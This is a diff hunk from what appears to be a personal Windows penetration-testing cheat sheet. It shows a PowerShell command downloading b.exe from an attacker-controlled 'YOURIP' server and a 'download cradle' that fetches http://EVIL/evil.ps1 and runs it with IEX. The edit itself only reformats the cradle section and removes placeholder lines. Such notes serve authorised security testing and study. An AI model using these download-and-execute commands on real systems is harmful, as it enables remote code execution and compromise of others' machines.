@@ -134,16 +134,13 @@ $ rdesktop (ip) -r disk:share=/home/bayo/store
 ```powershell
 $ powershell -c "(new-object System.Net.WebClient).DownloadFile('http://YOURIP:8000/b.exe','C:\Users\YOURUSER\Desktop\b.exe')"
 ```
-  * test 2
-	* test 13
-* test 456	
-* Download Cradle
-	```testingdownload
-	//check that it echos 
-	echo "IEX (New-Object Net.Webclient).downloadstring('http://EVIL/evil.ps1')"
-	//get rid of single quotes and pipe it - ippsec bastard video 23:10
-	echo IEX (New-Object Net.Webclient).downloadstring('http://EVIL/evil.ps1') | powershell -noprofile -
-	```
+  * Download Cradle
+  ```testingdownload
+  //check that it echos 
+  echo "IEX (New-Object Net.Webclient).downloadstring('http://EVIL/evil.ps1')"
+  //get rid of single quotes and pipe it - ippsec bastard video 23:10
+  echo IEX (New-Object Net.Webclient).downloadstring('http://EVIL/evil.ps1') | powershell -noprofile -
+  ```
 
 ## Process
 - systeminfo
